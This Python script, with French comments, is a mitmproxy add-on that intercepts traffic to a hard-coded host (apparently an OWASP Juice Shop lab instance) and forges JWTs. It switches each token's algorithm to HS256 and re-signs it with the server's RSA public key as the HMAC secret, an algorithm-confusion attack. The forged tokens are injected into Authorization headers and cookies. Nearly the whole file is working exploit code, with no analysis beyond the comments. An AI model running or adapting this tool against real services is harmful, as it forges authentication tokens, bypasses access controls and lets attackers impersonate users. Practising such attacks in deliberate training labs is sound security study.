#!/usr/bin/env python3

import json
import base64
import hmac
import hashlib
import asyncio
import re

from mitmproxy import http, options
from mitmproxy.tools.dump import DumpMaster

################################
# Configuration
################################

RSA_PUBLIC_KEY_RAW = """-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
-----END RSA PUBLIC KEY-----
"""
# Nettoyage pour n’avoir que le bloc Base64
RSA_PUBLIC_KEY_CLEAN = (
    RSA_PUBLIC_KEY_RAW
        .replace("-----BEGIN RSA PUBLIC KEY-----", "")
        .replace("-----END RSA PUBLIC KEY-----", "")
        .replace("\n", "")
        .strip()
)

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8080

################################
# Fonctions utilitaires
################################

def b64url_encode(data: bytes) -> str:
    """Encode data en Base64URL, sans '=' final."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data: str) -> bytes:
    """Décode la Base64URL en gérant le padding."""
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)

def forge_jwt(original_token: str) -> str:
    """
    Force alg=HS256 et recalcule la signature
    en utilisant RSA_PUBLIC_KEY_CLEAN comme secret HMAC.
    Affiche en console le token original, sa signature,
    puis le token forgé et la nouvelle signature.
    """
    # On loggue le token original
    print("\n=== [Forge] Original JWT ===")
    print(original_token)

    # Split header/payload/old_sig
    header_b64, payload_b64, old_sig_b64 = original_token.split(".")
    print(f"Ancienne signature : {old_sig_b64}")

    # Décodage JSON
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))

    # Forcer alg = HS256
    header["alg"] = "HS256"

    # Reconstruire header/payload
    new_header_b64 = b64url_encode(json.dumps(header).encode())
    new_payload_b64 = b64url_encode(json.dumps(payload).encode())

    # Re-signer HMAC-SHA256
    to_sign = f"{new_header_b64}.{new_payload_b64}".encode()
    sig = hmac.new(RSA_PUBLIC_KEY_CLEAN.encode(), to_sign, hashlib.sha256).digest()
    new_sig_b64 = b64url_encode(sig)

    forged_token = f"{new_header_b64}.{new_payload_b64}.{new_sig_b64}"

    # On loggue le token forgé
    print("=== [Forge] Forged JWT ===")
    print(forged_token)
    print(f"Nouvelle signature : {new_sig_b64}\n")

    return forged_token

################################
# Classe d'interception
################################

class InterceptJWT:
    """
    Add-on mitmproxy. 
    Intercepte les requêtes vers 45.76.47.218:3000, 
    force alg=HS256 pour le JWT en Authorization ou dans le cookie.
    """

    def request(self, flow: http.HTTPFlow):
        # On ignore tout ce qui n’est pas pour Juice Shop
        if "45.76.47.218:3000" not in flow.request.pretty_url:
            # On évite de logguer le bruit (TLS fails, etc.)
            return

        # Vérifier header Authorization
        auth_header = flow.request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            original_token = auth_header.removeprefix("Bearer ").strip()
            try:
                new_jwt = forge_jwt(original_token)
                flow.request.headers["Authorization"] = f"Bearer {new_jwt}"
                print("[*] Authorization: JWT forgé injecté (HS256).")
            except Exception as e:
                print("[!] Erreur forging Authorization:", e)

        # Vérifier cookie token=...
        cookie = flow.request.headers.get("cookie", "")
        if "token=" in cookie and "45.76.47.218:3000" in flow.request.pretty_url:
            match = re.search(r"token=([^;]+)", cookie)
            if match:
                cookie_token = match.group(1)
                try:
                    new_jwt = forge_jwt(cookie_token)
                    # Remplace uniquement la valeur token=...
                    new_cookie = re.sub(r"token=[^;]+", f"token={new_jwt}", cookie)
                    flow.request.headers["cookie"] = new_cookie
                    print("[*] Cookie: JWT forgé injecté (HS256).")
                except Exception as e:
                    print("[!] Erreur forging cookie token:", e)

################################
# Lancement mitmproxy
################################

class NoisyDomainsFilter:
    """
    Petit add-on pour filtrer les messages TLS handshake failed 
    vers des domaines qu’on ne souhaite pas logger (Google, Microsoft, etc.)
    """
    def log(self, entry):
        msg = str(entry.msg)
        if any(d in msg for d in ["google", "microsoft", "youtube", "ghostery"]):
            # On ignore ces logs bruyants
            pass
        else:
            print(entry.msg)

async def run_proxy():
    opts = options.Options(listen_host=LISTEN_HOST, listen_port=LISTEN_PORT)
    m = DumpMaster(opts)
    m.addons.add(NoisyDomainsFilter())   # Filtre le bruit
    m.addons.add(InterceptJWT())        # Add-on forging

    try:
        await m.run()
    except KeyboardInterrupt:
        print("[!] Proxy interrompu.")

def main():
    asyncio.run(run_proxy())

if __name__ == "__main__":
    main()
